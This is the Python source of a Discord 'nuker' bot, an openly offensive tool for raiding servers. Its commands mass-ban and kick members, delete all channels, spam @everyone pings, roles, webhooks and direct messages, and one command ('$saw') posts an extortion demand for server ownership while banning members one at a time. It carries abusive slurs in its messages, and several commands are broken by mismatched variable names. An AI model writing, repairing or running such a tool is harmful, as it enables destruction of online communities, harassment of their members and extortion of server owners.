import discord
import random
import threading
import time
from discord.ext import commands 
import asyncio
import webbrowser
import os
import requests

owner = 997600477204197577



TOKEN = ""
client = discord.Client(intents=discord.Intents.all())

@client.event
async def on_ready():
     webbrowser.open("https://discord.gg/eKG6vCmAt7")
     print("cmds : $kick all, $ban all, $change guild name, $spam owner, $spam webhooks, $spam rolls, $nuke, $delete all channels, $silent takeout, $spam members, $saw")




        






@client.event
async def on_message(message):
    username = str(message.author).split("#")[0]
    user_message = str(message.content)
    channel = str(message.channel.name)
    nuking = False


    if message.author == client.user:
        return
    
    if nuking == True:
         if message.author.id == owner:
             print
         else:  
            message.author.Ban()
    
   
    if user_message.lower() == '$nuke' and message.author.id ==  owner:
            await message.delete()
            while True:
                await message.channel.send("@everyone nuked by yuhxx")
                await message.guild.create_text_channel('nuked')
                channelss = discord.utils.get(client.get_all_channels(), guild=message.author.guild, name='nuked!!!!!')
                await message.channel.send("@everyone KABOOOM get nuked buddy https://www.youtube.com/watch?v=WV6eWoTgLSI")
                nuking = True
                print('started')

                try:
                    for channels in message.guild.channels :

                        
                        await channels.send("@everyone KABOOOM get nuked buddy https://www.youtube.com/watch?v=WV6eWoTgLSI")



                        if channels.name == 'nuked':
                            print()
                        else:   
                            await channels.delete()
                except Exception as e:
                     print(f"{channels.name} could not be deleted.")
        
    if user_message.lower() == '$ban all' and message.author.id == owner:
            await message.delete()
            for member in message.guild.members:
                try:
                    if member.id == owner:
                        print
                    else:
                        await member.ban(reason="get fucking nuked by yuhx bitch")
                        print(f"Banned : {member}")
                except Exception as e:
                    print(member.name," couldn't be banned.")
            
    if user_message.lower() == '$kick all' and message.author.id == owner:
            await message.delete()
            for members in message.guild.members:
                try:
                    if member.id == owner:
                        pass
                    else:
                        await members.kick(reason="get fucking nuked cringe ass bitch")
                        print(f'kicked : {members}')
                except Exception as es:
                    print(members.name," could not be kicked.")

    if user_message.lower() == '$change guild name' and message.author.id == owner:
            await message.delete()
            names = input("name it to? : ")
            await message.guild.edit(name=f"{names}")

    if user_message.lower() == '$role spam' and message.author.id == owner:
         await message.delete()
         rolecount = input("how many roles : ")
         rolename = input("role name? : ")
         numberedcount = int(rolecount)

         for role in range(numberedcount):
              await message.guild.create_role(name=f'{rolename}')

    if user_message.lower() == '$delete all channels' and message.author.id == owner:
         await message.delete()
         try:
                for channelsss in message.guild.channels:
                    await channelss.delete()
         except Exception as exccc:
            print(f'{channelss.name} could not be deleted.')
                


    if user_message.lower() == '$spam webhooks' and message.author.id == owner:
         await message.delete()
         webhooks = input("How many webhooks? : ")
         webhookname = input("webhook name? : ")

         try:
              
            for webhook in range(int(webhooks)):
              await message.channel.create_webhook(name=str(webhookname))
                
              print('webhook created')
         except Exception as asss:
              print(f"{webhook.name} could not be made")


    if user_message.lower() == '$spam owner' and message.author.id == owner:
         await message.delete()
         whattosend = input("What do you want to spam him with? : ")
         timesof = input("How many times? : ")
         owner = message.guild.owner
         
         for times in range(int(timesof)):   
            await owner.send(str(whattosend))

    if user_message.lower() == '$spam notifs' and message.author.id == owner:
         await message.delete()
         timess = input("Times? : ")

         for timesss in range(int(timess)):
              await message.channel.send("@here @everyone")

    if user_message.lower() == '$spam members' and message.author.id == owner:
         await message.delete()
         timesssss = input(" how many times? : ")
         whatt = input("what to send? : ")

         for memberssss in message.guild.members:
              if memberssss.id == owner:
                   print
              else:                    
                    for memmm in range(int(timesssss)):
                        await memberssss.send(whatt)

    if user_message.lower() == '$saw' and message.author.id == owner:
         ownerid = message.guild.owner.name
         sawhasownership = False
         await message.channel.send(f"@{ownerid}, your server is being raided and you have to give @yuhx ownership. While you do not give me it, your members will be banned, 1 by 1.")

         await message.delete()

         while sawhasownership == False:
              for mem in message.guild.members:
                   time.sleep(1)
                   await mem.ban()
                   await message.channel.send("banned.")

                   if message.guild.owner.id == owner:
                        sawhasownership = False

    if user_message.lower() == '$silent takeout' and message.author.id == owner:
            await message.delete()
            try:
                for memm in message.guild.members:
                    time.sleep(5)
                    await memm.ban(reason="Silent takeout.")
            except Exception as ep:
              print(f"{memm.name} was not banned.")

    if user_message.lower() == '$change icon':
            print("put the image in the file that contains the nuker, image has to be 512 x 512.")
            imagename = input("image directory : ")
            imagetype = input("image type : ")
            actimt = str(imagetype)
            acin = str(imagename)
            with open(f"{imagename}.{imagetype}", 'rb') as f:
                icon = f.read()
            await message.guild.edit(icon=icon)


                
                 

         

    




        


            

        
        

        
        
        


client.run(TOKEN)
